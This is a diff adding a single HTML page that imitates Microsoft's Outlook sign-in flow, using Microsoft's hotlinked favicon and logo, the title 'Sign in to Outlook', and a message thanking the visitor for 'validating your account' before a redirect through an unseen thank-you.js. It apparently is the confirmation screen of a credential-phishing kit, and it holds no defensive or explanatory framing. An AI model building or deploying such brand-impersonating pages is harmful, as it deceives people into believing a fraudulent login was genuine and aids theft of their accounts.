@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link
+      rel="icon"
+      href="https://logincdn.msftauth.net/16.000.30293.2/images/favicon.ico" />
+    <title>Sign in to Outlook</title>
+  </head>
+  <body class="body">
+    <style>
+      .body {
+        font-family: "Segoe UI", -apple-system, "Helvetica Neue",
+          "Lucida Grande", Roboto, Ebrima, "Nirmala UI", Gadugi,
+          "Segoe Xbox Symbol", "Segoe UI Symbol", "Meiryo UI", "Khmer UI", Tunga,
+          "Lao UI", Raavi, "Iskoola Pota", Latha, Leelawadee,
+          "Microsoft YaHei UI", "Microsoft JhengHei UI", "Malgun Gothic",
+          "Estrangelo Edessa", "Microsoft Himalaya", "Microsoft New Tai Lue",
+          "Microsoft PhagsPa", "Microsoft Tai Le", "Microsoft Yi Baiti",
+          "Mongolian Baiti", "MV Boli", "Myanmar Text", "Cambria Math";
+
+        height: 100vh;
+        margin-top: 10rem;
+      }
+      .style-0 {
+        margin-top: 24px;
+        height: 36px;
+        margin-bottom: 24px;
+        box-sizing: border-box;
+      }
+
+      .style-1 {
+        max-width: 256px;
+        max-height: 36px;
+        display: block;
+        margin-left: auto;
+        margin-right: auto;
+        animation: 1s ease 0s 1 normal none running fadeIn;
+        /* vertical-align: middle; */
+        box-sizing: border-box;
+        border: 0px none rgb(27, 27, 27);
+      }
+      .texts {
+        text-align: center;
+        display: flex;
+        flex-direction: column;
+      }
+    </style>
+    <div class="style-0">
+      <img
+        class="style-1"
+        role="presentation"
+        data-bind="attr: { src: $page.backgroundLogoUrl }"
+        src="https://aadcdn.msauth.net/shared/1.0/content/images/applogos/53_7a3c80bf9694448bac31a9589d2e9e92.png" />
+    </div>
+    <div class="texts">
+      <span>Thank You for validating your account.</span>
+      <span>No futher action required.</span>
+      <span>You will be redireted shortly.</span>
+    </div>
+
+    <script src="thank-you.js" type="text/javascript"></script>
+  </body>
+</html>
